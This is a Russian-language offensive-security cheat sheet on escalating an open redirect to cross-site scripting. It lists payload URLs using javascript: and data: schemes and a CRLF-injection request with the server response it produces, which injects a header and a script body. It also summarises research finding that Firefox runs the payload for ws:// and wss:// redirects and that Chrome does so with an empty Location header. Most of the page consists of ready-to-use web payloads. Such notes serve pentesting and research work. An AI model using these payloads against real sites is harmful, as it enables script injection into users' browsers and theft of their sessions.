# Open Redirect To XSS

## Open Redirect to XSS via javascript: schema

```
Redirect: https://example.com/?url=https://attacker.com/

Пробуем:
HTMLi: https://example.com/?url=data:text/html;%3Ch1%3Etest%3C/h1%3E
XSS: https://example.com/?url=javascript:prompt(document.domain)//
```

## Open Redirect to XSS via CRLF&#x20;

paper: [https://www.gremwell.com/firefox-xss-302](https://www.gremwell.com/firefox-xss-302)

Если у нас есть open redirect, то мы можем попробовать встроить через CRLF свой заголовок и свое тело в ответ сервера

```
GET /?redir=https://other.com/%0AInjected-Header:%20value%0A%0A<script>alert(1)</script> HTTP/1.1
Host: test.com


HTTP/1.0 302 Found
Location: https://other.com/
Injected-Header: value

<script>
    alert(1)
</script>
```

Однако, современные браузеры (Google Chrome, IE, Firefox) не интерпретируют HTTP response body, если статус ответа 302. Следовательно, XSS пэйлоад бесполезен. Ищем обход!

Есть статьи и отчеты, в которых говорится, что в каких-то версиях отрабатывали xss payloads, если схемы перенаправлений были: mailto:// и какие-то еще отдельные. Еще был отчет у Twiiter, в котором перенаправление было по схеме //x:1/.

Автор статьи решил профаззить по этому списку схем: [IANA URI schemes list](https://www.iana.org/assignments/uri-schemes/uri-schemes.txt). И фаззил следующие реддиректы: redir=\[URI\_SCHEME]://gremwell.com%0A%0A\[XSS\_PAYLOAD]

В итоге, только в FF отработали 2 схемы (вызвали alert()) - ws:// и wss://

Сергей Бобров в комментах к твиту указал на то, что Google Chrome с пустым Location, так же исполняет payoad!
